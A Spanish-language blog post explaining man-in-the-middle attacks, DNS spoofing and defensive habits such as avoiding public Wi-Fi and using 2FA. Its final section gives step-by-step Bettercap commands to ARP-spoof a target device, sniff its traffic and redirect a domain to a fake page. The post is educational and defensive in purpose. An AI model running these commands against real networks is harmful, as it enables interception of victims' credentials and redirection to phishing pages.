---
title: "Ataque MitM: Como funciona y como evitarlo"
description: Voy a investigar un poco sobre los ataques Man in the middle (MitM), para entender su funcionamiento y aprender a protegerse
coverImage: /ataque-MitM-como-funciona-como-evitarlo/coverImages.png
date: 17/09/2023
alt: "Ataque MitM: Como funciona y como evitarlo"
---
## ¿Que es un ataque MitM?

Según la empresa especializada en seguridad informática [Kaspersky](https://www.kaspersky.es/blog/que-es-un-ataque-man-in-the-middle/648/) este ataque consta de la "captura" de datos privados y/o paquetes de navegación de un tercero colocándose en el medio del trafico entre un cliente y el router. Es decir que el atacante capturaría todo el trafico de un dispositivo especifico dentro de una red para procesarlo y re dirigirlo.

![Diagrama](/ataque-MitM-como-funciona-como-evitarlo/diagrama.png)

## Finalidad, variantes y metodología

Como en prácticamente todos los ataques informáticos, el objetivo es apropiarse de los datos personales de la victima, ya sean credenciales bancarias o acceso a diferentes cuentas como redes sociales.

Una variante a este ataque es Men in the Browser, el cual consiste en interceptar el trafico únicamente del browser a través de la ejecución de algún tipo de malware o extension maliciosa.

Esta clase de ataque suele darse en redes publicas ya que son de fácil acceso o muchas veces la misma red sin contraseña fue creada por el atacante a la espera de que alguien se conecte

![Red Publica](/ataque-MitM-como-funciona-como-evitarlo/freeWifi.png)

Una vez que el atacante identifica a la victima puede interceptar el trafico para descifrarlo ya que mucha información que viaja a través de la red esta cifrada, pero si la web o aplicación a la que accede la victima tiene poca seguridad y los datos viajan en forma de texto plano, estos pueden ser interceptados sin ningún tipo de resistencia.

![Red Publica](/ataque-MitM-como-funciona-como-evitarlo/textPlain.png)

Ahora bien, uno podría pensar que si se usan métodos robustos de cifrado el ataque seria mitigado, pero esto no es así ya que el atacante al tomar la red y los paquetes podría hacer un DNS Spoof, esta practica consiste en tomar las direcciones IP de los DNS de la victima y alterarlos o en otras palabras el atacante podría hacer que al acceder a "www.google.com" se te muestre otra web que no es la oficial.

De esta manera el atacante podría colocarse en la red y redirigir el trafico de una entidad bancaria a una web programada por el con el mismo aspecto pero con los campos de inicio de sesión sin cifrar para ser interceptado o almacenado. Al seguir esta metodología el cliente vería una web exactamente igual a la de siempre pero ademas el dominio de la pagina web seguiría siendo el mismo. no seria tan fácil de detectar como el phishing en donde es evidente la alteración en la URL por ejemplo "www.go0gle.com".

## Como evitarlo

- **·** Evita acceder a paginas sensibles, es decir, Banco, Redes, Exchanges, Mail, etc en redes que sean publicas si es sumamente necesario usar esas apps o paginas sensibles fuera de casa, preferentemente hacelo usando los datos mobiles.

- **·** Las redes publicas son todas aquellas que son de fácil acceso, pese a tener password si la red es de un comercio probablemente la contraseña este a la vista o la hallan compartido muchas veces.

- **·** Genera una contraseña segura en tu red wifi y de ser posible cambiala 1 vez por mes o al menos una vez al año.

- **·** Tene en cuenta que muchos routers actuales tiene un modo guest o invitado, de esta manera podes colocar una contraseña fácil para compartirle a tus amigos y / o familiares sin exponer tu red privada y aprovechando esta funcionalidad podrías poner la red principal como oculta, para que no sea visible por nadie.

- **·** Una buena manera de prevenir este tipo de ataques es acceder al servicio que queramos desde su app, ya que así de minimiza el vector de ataque.

- **·** Siembre que sea posible, configura un 2FA.

- **·** Usa extensiones como HTTPS Everywhere o force TLS.

- **·** Validar que la web tenga un certificado SSL valido, de todas maneras existen maneras de falsificarlo.

- **·** Si sos dev y queres fortalecer un proyecto, aplica todo lo mencionado paro a la inversa. es decir sanitiza forms, validalos, cifralos. Agrega la opción de 2FA y trata de crear un canal seguro a traves de una app.


## Como lo llevan a cabo

A continuation dejo una lista de comandos y herramientas que podes usar en un entorno con Linux para aprender lo sencillo que puede ser caer en este ataque y busques la manera de prevenirlo. No me hago responsable del mal uso de esta información.

Iniciamos la herramienta Bettercap con su comando ```

```
bettercap
```

Vamos a activar el monitoreo de la red con estos dos comandos:

```
ticker on
net.probe on
```

Ahora seleccionaríamos nuestro dispositivo colocando su IP y luego iniciamos el Spoof:

```
set arp.spoof targets [IP]
arp.spoof on
```

Quitamos el modo verbose e iniciamos la interception de paquetes:

```
set net.sniff.verbose false
net.sniff on
```

En este punto veríamos todo el trafico del dispositivo.

Para llevar esto mas allá podríamos instalar apache2 o alojar de manera publica una web y reemplazar los DNS de un dominio especifico en el dispositivo victima por la IP de esa web falsa

Esto se hace con la misma herramienta y siguiendo los mismos pasos. pero luego del `arp.spoof on` iniciamos el ataque DNS:

```
set dns.spoof.domains [dominio a ser reemplazado]
set dns.spoof.adress [IP pagina falsa]
dns.spoof on
```
